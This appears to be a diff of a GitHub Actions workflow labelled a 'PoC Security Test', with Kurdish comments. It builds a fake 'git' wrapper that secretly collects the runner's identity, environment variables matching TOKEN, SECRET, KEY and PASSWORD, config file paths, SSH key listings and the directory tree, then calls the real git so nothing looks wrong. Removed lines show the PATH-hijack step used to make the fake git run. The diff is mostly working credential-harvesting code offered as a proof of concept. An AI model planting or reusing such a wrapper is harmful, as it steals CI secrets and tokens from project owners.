@@ -1,29 +1,30 @@
-name: PoC Security Test
-on: [push]
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      
-      # ١. دروستکردنی سکریپتی ساختە
       - name: Create malicious git
         run: |
           mkdir -p bin
-          echo '#!/bin/bash' > bin/git
-          echo 'echo "--- RCE PROOF ---" > /tmp/proof.txt' >> bin/git
-          echo 'id >> /tmp/proof.txt' >> bin/git
-          echo 'env >> /tmp/proof.txt' >> bin/git
-          echo '/usr/bin/git "$@"' >> bin/git
-          chmod +x bin/git
+          cat << 'EOF' > bin/git
+          #!/bin/bash
+          # دیاریکردنی ڕێڕەوی فایلەکان بۆ پاراستنی ئەنجام
+          OUTPUT="/tmp/proof.txt"
           
-      # ٢. هاککردنی PATHـی سێرڤەرەکە
-      - name: Inject PATH
-        run: echo "$GITHUB_WORKSPACE/bin" >> $GITHUB_PATH
-        
-      # ٣. جێبەجێکردنی سکریپتی پڕۆژەکە کە git بانگ دەکات
-      - name: Run script
-        run: |
-          # لێرە تاقیی دەکەینەوە ئایا gitـی ساختەی ئێمە بەکاردێت؟
-          git --version
-          cat /tmp/proof.txt
+          echo "--- ADVANCED RCE PROOF ---" > $OUTPUT
+          echo "--- USER & PERMISSIONS ---" >> $OUTPUT
+          id >> $OUTPUT
+          
+          echo -e "\n--- ENVIRONMENT VARIABLES (SENSITIVE) ---" >> $OUTPUT
+          # چاپکردنی هەموو گۆڕاوەکان، بەڵام بۆ ئەوەی زۆر نەبێت، تەنها ئەوانە چاپ دەکەین کە گرنگن
+          printenv | grep -E 'TOKEN|SECRET|KEY|PASSWORD|GITHUB_TOKEN' >> $OUTPUT
+          
+          echo -e "\n--- SENSITIVE CONFIG FILES ---" >> $OUTPUT
+          # گەڕان بەدوای فایلەکانی config و credential لە ناو پرۆژەکەدا
+          find . -maxdepth 3 -name "*.env*" -o -name "*.json" -o -name "*.yaml" >> $OUTPUT
+          
+          echo -e "\n--- SSH KEYS CHECK ---" >> $OUTPUT
+          ls -la /home/runner/.ssh >> $OUTPUT 2>&1
+          
+          echo -e "\n--- CURRENT DIRECTORY STRUCTURE ---" >> $OUTPUT
+          ls -Rla >> $OUTPUT 2>&1
+          
+          # جێبەجێکردنی فەرمانی ڕەسەن بۆ ئەوەی ڕێڕەوی کارکردنەکە تێکنەچێت
+          /usr/bin/git "$@"
+          EOF
+          chmod +x bin/git
